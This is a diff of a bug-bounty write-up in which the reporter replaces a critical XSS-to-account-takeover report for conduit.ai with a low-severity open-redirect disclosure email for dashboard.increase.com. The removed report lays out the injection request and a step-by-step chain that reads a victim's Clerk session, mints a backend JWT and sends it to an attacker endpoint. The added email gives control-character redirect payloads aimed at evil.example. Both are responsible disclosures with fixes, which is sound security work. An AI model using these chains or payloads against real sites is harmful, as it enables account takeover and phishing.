@@ -1,137 +1,58 @@
-# Account Takeover via Reflected XSS on `dial.conduit.ai` → cross-subdomain Clerk session-token minting
+**To:** security@increase.com (reply in the existing thread "Responsible Security Disclosure – Valid Vulnerability Report")
+**Subject:** [Low] Open redirect after SSO login on dashboard.increase.com via control character in `redirect` parameter
 
-| | |
-|---|---|
-| **Program** | Conduit Security Vulnerability Disclosure & Bug Bounty Policy (Xposera) |
-| **Entry point** | `https://dial.conduit.ai/` (`company` parameter) — in scope (`https://*.conduit.ai/`) |
-| **Vulnerability class** | Reflected XSS (CWE-79) chained to Account Takeover (CWE-384 / CWE-942) |
-| **Intrinsic severity** | **Critical** — CVSS 3.1 **9.0** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` |
-| **Program-capped severity** | **High** (this asset's max severity is High) |
-| **Authentication** | None (attacker); victim need only open one link |
-| **Reporter / Date** | Gowthambalaji S (gowtham@auditifysecurity.com) / 2026-10-09 |
+Hi Increase Security team,
 
----
+As you suggested, here is a report with reproduction steps.
 
-## 1. Summary
+## Summary
+An attacker can send an Increase user who signs in with SSO a genuine `dashboard.increase.com` login link. Once the user completes SSO, the dashboard sends them to an external site the attacker chose. The post-login path sanitizer strips leading `/` and `\`, but not tab or newline characters, and browsers remove those characters when they parse a URL.
 
-`dial.conduit.ai` reflects the `company` query parameter into its HTML with **no output encoding
-and no Content-Security-Policy**, giving an unauthenticated attacker arbitrary JavaScript execution
-in the `dial.conduit.ai` origin.
+**Affected:** `https://dashboard.increase.com`, current production bundle `/assets/index-ByLgVfuc.js` (verified 2026-10-10).
 
-Because Conduit authenticates with **Clerk**, and Clerk's Frontend API (`clerk.conduit.ai`) **allows
-credentialed cross-origin requests from `conduit.ai` subdomains**, JavaScript running in the
-`dial.conduit.ai` origin can read the victim's active Clerk session and **mint a fresh Convex-audience
-session token** for that victim. That token grants full authenticated access to the victim's Conduit
-account and workspace through the backend API (`api.conduit.ai` / Convex).
+## Root cause (production bundle, minified names)
+```js
+s = o.get(`redirect`)                                    // login page reads ?redirect=
+k1 = (e,t) => encodeURIComponent(btoa(JSON.stringify({nextUrl:t, email:e})))   // carried through SSO in `state`
 
-**Net result:** one click on an attacker link = complete takeover of the victim's Conduit account.
-The session cookie being `HttpOnly` does **not** prevent this, because the attacker's script mints a
-brand-new token rather than reading the cookie.
-
-## 2. Reflected XSS (the injection point)
-
-Unauthenticated request with HTML metacharacters in `company`, and the verbatim response — `<b>`,
-`"`, `'`, `=` all returned **unencoded**:
-
+// /authentication_callback, after the session is created:
+window.location.replace(uG(r?.nextUrl || ``))
+uG = e => `/${e.replace(/^[\\/]+/, ``)}`
 ```
-GET /?company=ZZmark7<b>"'=</b> HTTP/2
-Host: dial.conduit.ai
-```
-```html
-<div class="error-message">
-    No report found for company: <strong>ZZmark7<b>"'=</b></strong>
-</div>
-```
-Response is `Content-Type: text/html` with **no `Content-Security-Policy`** and no
-`X-Content-Type-Options`. `<script>…</script>` is reflected intact.
+With `nextUrl = "\t/evil.example"`, `uG` returns `"/\t/evil.example"`. WHATWG URL parsing removes ASCII tab and newline characters, so this becomes `//evil.example`, which resolves to `https://evil.example/`.
 
-**Proof of execution** (banner painted by injected JS reading `document.domain` + `document.cookie`):
-see `evidence/dial_xss_banner_proof.jpg` — red banner
-`XSS EXECUTED — origin: dial.conduit.ai — cookies readable: 1007 bytes`.
+## Steps to reproduce
+1. As a user whose email domain uses SSO, open:
+   `https://dashboard.increase.com/login?redirect=%09/evil.example`
+2. Enter the SSO email and complete sign-in with the identity provider.
+3. After `/authentication_callback`, the browser lands on `https://evil.example/`.
 
-## 3. Escalation to Account Takeover
+`%0a/evil.example` and `%0d%0a//evil.example` behave the same way.
 
-The following runs inside the `dial.conduit.ai` origin (delivered by the XSS payload). All steps use
-the victim's ambient, same-site `.conduit.ai` cookies (`credentials: 'include'`).
-
-**Step A — read the victim's Clerk session (CORS-permitted cross-origin):**
-```
-GET https://clerk.conduit.ai/v1/client?__clerk_api_version=2025-11-10&_clerk_js_version=5.0.0
-    (credentials: include)   →  HTTP 200, response body readable, active session id obtained
+**Sanitizer check** (any browser console on `dashboard.increase.com`):
+```js
+const uG = e => `/${e.replace(/^[\\/]+/, ``)}`;
+new URL(uG("\t/evil.example"), location.origin).href  // "https://evil.example/"
+new URL(uG("//evil.example"), location.origin).href   // "https://dashboard.increase.com/evil.example" (blocked as intended)
 ```
 
-**Step B — mint a Convex-audience session token for the victim:**
+**Verification note:** I confirmed the code path in the production bundle and the URL resolution in Chrome. I don't have an SSO-enabled organization, so I couldn't run the full SSO login end to end. An internal SSO test org should confirm it in a minute.
+
+## Impact
+- **Phishing from a trusted start:** the victim clicks a real `dashboard.increase.com` URL, authenticates with their real identity provider, and then lands on an attacker page that can imitate Increase (for example, "session expired, re-enter your credentials and 2FA code").
+- **Limits:** this affects SSO users only. It can't produce XSS, because the output always starts with `/` so `javascript:` isn't reachable, and the CSP blocks inline script anyway. No token leaks: the auth code is exchanged before the redirect, and only the origin is sent as the Referer.
+
+I'm reporting this as **Low**.
+
+## Suggested fix
+Resolve the value against the current origin and only redirect when it stays same-origin:
+```js
+const u = new URL(nextUrl, location.origin);
+location.replace(u.origin === location.origin ? u.pathname + u.search + u.hash : "/");
 ```
-POST https://clerk.conduit.ai/v1/client/sessions/{sessionId}/tokens/convex?__clerk_api_version=2025-11-10&_clerk_js_version=5.0.0
-     (credentials: include)  →  HTTP 200, { "jwt": "<valid session JWT, >100 chars>" }
-```
+Alternatively, reject values containing control characters (`\x00`–`\x1F`, `\x7F`) before applying the existing check.
 
-**Step C — use the minted token against Conduit's backend as the victim:**
-```
-POST https://knowing-emu-505.convex.cloud/api/query     (= api.conduit.ai backend)
-Authorization: Bearer <minted jwt>
-{ "path": "users/workspacePreferences:resolveLandingWorkspace", "args": {}, "format": "json" }
-     →  HTTP 200, { "status": "success", ... }   (authenticated victim data)
-```
+**CVSS 3.1:** AV:N/AC:H/PR:N/UI:R/S:C/C:N/I:L/A:N, score 3.4 (Low)
 
-**Step D — exfiltrate / act.** The attacker's script sends the minted JWT to an attacker-controlled
-endpoint (webhook), or simply drives authenticated API calls directly from the victim's browser:
-read all contacts / conversations / tickets / calls, send messages as the victim, change account and
-workspace settings, create API tokens, etc.
-
-### Observed results (reproduced 2×, on the reporter's own account)
-
-```
-origin        = https://dial.conduit.ai
-readSession   = true          (Step A: HTTP 200, session parsed)
-mintConvex    = 200           (Step B: token minted)
-jwtValid      = true          (JWT length > 100)
-apiCall       = 200           (Step C: backend accepted the token)
-apiAuthed     = YES           (backend returned authenticated victim data)
-```
-
-## 4. Root cause
-
-1. **Reflected XSS** — `dial.conduit.ai` inserts `company` into HTML without encoding; no CSP.
-2. **Over-permissive cross-origin auth** — Clerk's Frontend API accepts credentialed requests from
-   `dial.conduit.ai` (a non-login subdomain) and lets it mint session tokens. Combined with
-   `.conduit.ai`-scoped, same-site session cookies, this lets **any** XSS on **any** `*.conduit.ai`
-   subdomain mint a victim's token and take over the account.
-
-The `HttpOnly` flag on `__session` provides no protection here: the attack mints a new token via the
-authenticated session rather than reading the cookie.
-
-## 5. Impact
-
-Full account takeover of any Conduit user who opens an attacker-supplied `dial.conduit.ai` link:
-
-- Read all of the victim's workspace data (contacts, conversations, tickets, calls, knowledge base).
-- Act as the victim (send messages, change settings, create API tokens, invite/remove members).
-- Persist access by minting long-lived API tokens from the victim's session.
-
-**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` = **9.0 (Critical)**.
-Reported at **High** per this asset's program-defined maximum severity.
-
-## 6. Remediation
-
-1. **Fix the XSS** — HTML-entity-encode `company` (or render with `textContent`); add a strict CSP
-   (`default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'`) and
-   `X-Content-Type-Options: nosniff` on `dial.conduit.ai`.
-2. **Restrict Clerk allowed origins** — remove non-application subdomains (e.g. `dial.conduit.ai`)
-   from the Clerk instance's allowed origins so arbitrary `*.conduit.ai` origins cannot mint session
-   tokens. Treat every `conduit.ai` subdomain as a potential token-minting origin until it does.
-3. Audit all `*.conduit.ai` subdomains for XSS/HTML-injection, since any one of them is now an ATO
-   vector while (2) stands.
-
-## 7. Evidence (attached)
-
-| File | Description |
-|---|---|
-| `evidence/dial_xss_banner_proof.jpg` | XSS execution proof (banner written by injected JS). |
-| `evidence/dial_xss_execution.gif` | Screen recording of XSS execution. |
-| `evidence/dial_reflection_context.html` | Server response showing unencoded reflection. |
-| `evidence/dial_response_headers.txt` | Headers: no CSP / no nosniff. |
-| `evidence/ato_chain_results.txt` | Step A–C result flags (readSession/mintConvex/jwtValid/apiCall/apiAuthed). |
-
-All testing used the reporter's own account; no other tenant's data was accessed. Minted tokens were
-short-lived and no account state was modified.
+Thanks,
+Gowthambalaji S
